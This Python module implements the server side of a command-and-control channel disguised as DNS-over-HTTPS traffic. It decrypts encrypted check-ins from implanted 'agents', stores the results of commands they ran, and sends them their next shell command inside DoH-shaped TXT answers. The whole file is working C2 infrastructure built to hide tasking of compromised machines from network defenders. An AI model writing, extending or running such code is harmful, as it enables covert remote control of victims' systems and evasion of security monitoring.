"""HTTP DoH-shaped listener for DNS-style C2 transport.

GET /dns-query?name=<base64url(agent_id:enc_payload)>&type=TXT

Decodes the name, decrypts with the agent session key, handles results/tasks,
and returns a JSON TXT answer with the encrypted reply. Not a real DNS server.
"""
from __future__ import annotations

import base64
from urllib.parse import unquote

from flask import Flask, jsonify, request

from .crypto import decrypt, encrypt
from .state import State


def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    while len(s) % 4:
        s += "="
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    s = base64.b64encode(data).decode("ascii")
    return s.replace("+", "-").replace("/", "_").rstrip("=")


def create_doh(state: State) -> Flask:
    app = Flask(__name__)

    @app.get("/dns-query")
    def query():
        name = request.args.get("name", "")
        qtype = request.args.get("type", "TXT")
        if not name or qtype.upper() != "TXT":
            return jsonify({"Status": 3}), 400

        try:
            raw = _b64url_decode(name).decode("utf-8")
            agent_id, enc_payload = raw.split(":", 1)
        except Exception:
            return jsonify({"Status": 2}), 400

        agent = state.get_agent(agent_id)
        if not agent:
            return jsonify({"Status": 2}), 404
        agent.touch()

        try:
            payload = decrypt(enc_payload, agent.session_key)
        except Exception:
            return jsonify({"Status": 2}), 400

        if payload.startswith("RESULT:"):
            _, task_id, result = payload.split(":", 2)
            state.submit_result(task_id, result)

        task = state.pop_next_task(agent_id)
        if task is None:
            reply = encrypt("NOP", agent.session_key)
        else:
            cmd_line = " ".join([task.cmd, *task.args])
            reply = encrypt(f"TASK:{task.task_id}:{cmd_line}", agent.session_key)

        data = _b64url_encode(reply.encode("utf-8"))
        return jsonify(
            {
                "Status": 0,
                "TC": False,
                "RD": True,
                "RA": True,
                "AD": False,
                "CD": False,
                "Question": [{"name": name, "type": 16}],
                "Answer": [
                    {
                        "name": name,
                        "type": 16,
                        "TTL": 300,
                        "data": data,
                    }
                ],
            }
        )

    return app
